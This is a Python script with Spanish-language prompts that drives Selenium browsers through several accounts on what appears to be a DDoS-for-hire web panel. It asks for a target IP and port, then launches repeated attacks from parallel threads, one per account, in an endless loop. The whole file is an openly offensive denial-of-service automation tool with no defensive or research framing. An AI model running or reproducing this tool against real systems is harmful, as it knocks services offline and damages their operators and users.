from selenium import webdriver
from selenium.common.exceptions import *

import time
import traceback
from rich.console import Console
import logging
import threading

from bot import Bot
from config import Config
from utils.presets import Presets
import utils.start




config = Config()

main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.DEBUG)

presets = Presets(driver_type=config.driver)
service, options = presets.debug()












def get_user_input():
    console = Console()

    ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
    if ip == "":
        ip = config.attack["ip"]

    port = console.input(f"Ingrese el puerto (por defecto: {config.attack['port']}): ")
    if port == "":
        port = config.attack["port"]

    return ip, port

ip, port = get_user_input()




info = {
    "cookies": [
        ...
    ],
    "username": config.accounts[0][0],
    "password": config.accounts[0][1],
    "userAgent": config.user_agents[30]
}

main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.ERROR)



thr = []
x = 0


try:
    for account in config.accounts:
        info_ = {
            "username": account[0],
            "password": account[1] 
        }
        def main(info):
            i = 1
            try:
                driver = webdriver.Chrome(service=service, options=options)
               
            except AttributeError as e:
                raise e


            try:
                bot = Bot(driver=driver, info=info, main_logger=main_logger)
                bot.login_form()
                bot.DDoS_page()
                bot.close_button()
                
                while True:
                    try:
                        bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
                        print(f"-----------------\nejecución: {i}\ncuenta: {info['username']}\n-----------------")
                        time.sleep(config.attack["time"])
                    except KeyboardInterrupt:
                        break
                    except:
                        main_logger.error(traceback.format_exc())
                    finally:
                        i + 1

            except Exception as e:
                quit()

        t = threading.Thread(target=main, args=(info_,))
        
        t.start()
        time.sleep(1)
        thr.append(t)

        x += 1  # Incrementar x para avanzar a la siguiente cuenta en config.accounts
    time.sleep(99999)
    from typing import Any
    inp: Any = input("presiona enter para terminar proceso...")
    for thread in thr:
        thread.join()

except KeyboardInterrupt:
    for thread in thr:
        thread.join()
